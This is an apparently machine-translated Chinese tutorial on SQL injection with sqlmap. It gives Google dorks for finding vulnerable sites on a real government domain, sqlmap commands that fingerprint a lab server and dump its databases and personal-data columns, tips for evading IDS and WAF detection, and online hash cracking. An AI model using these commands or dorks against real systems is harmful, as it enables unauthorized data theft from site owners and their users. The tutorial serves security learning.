# SQL 注入实践概述(2/2)

> 原文：<https://medium.com/nerd-for-tech/sql-injection-practical-overview-2-2-5ce6827f63b?source=collection_archive---------10----------------------->

继续这个练习，我们刚刚讨论了 **SQLi** 的定义、可能的攻击类型、经典和盲态 SQLi**的工作原理、数据处理及其在 HTTP 中的差异，以及两个实际例子。**

手动做事情很棒，但是仅仅为了证明一个观点就需要大量的努力，并且根据你的技能，你可以努力尝试得到一个假阳性的场景或者可能跳过一个真实的场景。

有很多工具可以自动化和利用 **SQLi** 案例，但这里有几个值得一提，包括:

1.  Acunetix 是一个 web 漏洞分析器，可以识别 URL、字段 ID 和可利用的向量。它还显示了分析过程中出现的元素的描述，还可以向现有的内部 **SQLi** 模块发送请求，并通过几次点击获得结果
2.  **sqlmap** (稍后动手)是一个 **CLI** 程序，它让你定制查询，以便利用 **SQLi** 攻击媒介。这不是一个自动的过程，您必须根据以前的结果来指导您的查询。
3.  Havij 是一个面向 Windows 的工具，它允许你在一个丰富的 UI 环境中参数化 IP 地址、目标和请求方法。关于 **Havij** 的已知问题是它被认为非常嘈杂，很容易被任何 IDS 检测到。
4.  Burpsuite 是一个出色的工具，它有很多用于 web 分析的特性，其中之一是对 HTTP 请求的嗅探能力。Burpsuite 有一个插件市场，可以让你与其他工具集成以扩展功能。

有了所有可用的工具选项。这里的自然步骤是找到易受攻击的站点。这个过程可以手动完成，但是，在 **Google Hacking** 的帮助下，你可以很容易地找到有趣的结果。Google 除了是一个强大的搜索引擎之外，也可以被用作一个易受攻击的或者基础设施搜索引擎。它使用**呆子**，这是用于过滤和检测易受攻击的网站的命令。

以下是过滤 **SQLi** 易受攻击站点的几个示例:

1.  `site:gob.ve SQL error: (MySQL)`
2.  `site:gob.ve Warning: obdc_connect()`
3.  `site:gob.ve warning sql`

如果您能够成功过滤特定的错误描述符，将会显示更好的结果。

# 现在，重头戏来了！

至此，我们都知道了什么是 SQLi，如何手动执行，可用的工具，以及如何找到易受攻击的站点。

现在是时候用`sqlmap`弄脏我们的手了。

## 装置

Sqlmap 已经预装在 Kali Linux 操作系统中，但是如果您没有使用该操作系统，您可以随时下载它并将其安装在您自己的系统中。这个工具是一个 python 脚本，非常容易安装，你可以去他们的[网站](http://sqlmap.org/)或者检查它的 Github [库](https://github.com/sqlmapproject/sqlmap)并按照安装步骤进行。

## 基本命令

*免责声明:为了这个演示，我在一个受控的环境中使用了著名的“我的令人敬畏的照片博客”vuln lab*

1.  `sqlmap -u http://10.0.0.20/cat.php?id=2`
2.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql'`。`--dbms`选择要使用的数据库管理系统
3.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --level='3' --risk='2'`“级别”定义了要执行的检查/有效负载的数量，“风险”允许工具使用的有效负载类型，该值高达 3，其中包括繁重的 SQL 查询。
4.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --level='3' --risk='2' --finger`。`--finger`参数让您知道所使用的基础设施的类型
5.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --level='3' --risk='2' --finger --current-user`。它是不言自明的，它显示了数据库的当前用户
6.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --level='3' --risk='2' --finger --hostname`显示服务器的主机名

## 使用数据结构

1.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --finger -D 'photoblog' --tables`。这个程序选择`-D`(数据库)并显示表格。
2.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbms='mysql' --finger -D 'photoblog' -T categories --columns --dump`。这将选择数据库和名为`categories`的`-T`表，并提示列的结构及其值

还可以用`--dump-all`代替`--dump`来提取列的值。如果您正在查询一个带有散列值的表，您可以获取那些值并在*md5checking.com*或*crackstation.net*中执行检查

使用 **sqlmap** 的一个更简单的方法是使用`--wizard`标志。

## 盲 SQLi 案例

盲 **SQLi** 案例的体验几乎是相同的，一旦您检测到一个易受攻击的参数，您就可以运行 **sqlmap** 命令，并且根据返回的任何输出，您可以重复执行，希望成功

对于 **POST** 漏洞利用，我们需要使用 **Burpsuite** 或任何可以将请求保存到`.txt`文件中的代理。然后您可以运行带有`-r`标志的 **sqlmap** 命令来指向一个特定的文件名，还有`--current-user`标志

这里有一个例子:

`sqlmap -r request.txt --current-user`

## 经典 SQLi 案例

Sqlmap 在`-u`标志的帮助下区分`GET`利用案例

1.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) --dbs`
2.  `sqlmap -u [http://10.0.0.20/cat.php?id=2](http://10.0.0.20/cat.php?id=2) -D 'photoblog' -T categories -C name,email,phone --dump`

## 避免 IDSs

在许多情况下，目标基础设施可以拥有类似于`IDS`、`IPS`、`HDIS`、`WAF`的系统，这些系统可以检测到您对 **SQLi** 的尝试并被禁止。这对我们来说是个可怕的消息。

为了绕过这一点，我们可以应用这一技术来优化所需的参数并避免检测。

1.  `--delay=5`设置延迟会使请求变得更慢，因此 IDS 可以将其视为执行时间方面的一种攻击模式
2.  `timeout=10`在`10 secs`不成功将中止命令的执行
3.  `retriest=2`设置失败时连续尝试的次数
4.  `threads=5`线程的使用会分散系统的预期行为
5.  避免添加`-v`冗长，这不会改变速度，但需要更多的信息细节
6.  使用`-p`并要求某些参数来利用。

使请求变慢将试图模拟一个常规请求而不是一个自动请求，后者很容易被阻塞。

## auth 呢？

POST 请求倾向于使用身份验证机制，为此，我们可以:

`sqlmap --auth-type=Basic --auth-cred='email:password' --forms -u [URL] ---level=3 --risk=3 --dbs`

我们这里有两个新朋友。

1.  `--auth-type`将设置使用的 HTTP 协议
2.  `--auth-cred`将有一个用于我们攻击的明文注册凭证

这里的一个提示是筛选要评估的参数。

SQLi 也可以在许多其他工具中执行。 **Burpsuite** 有一个名为 **C02** 的扩展，它与 **Sqlmap** 相结合，为 **SQLi** 创建了一个大规模的集成工具。Acunetix 还在其扫描中包含了 **SQLi** 漏洞。

所以，这里使用的工具无论在哪里都会抛出相同的结果。

黑客快乐:)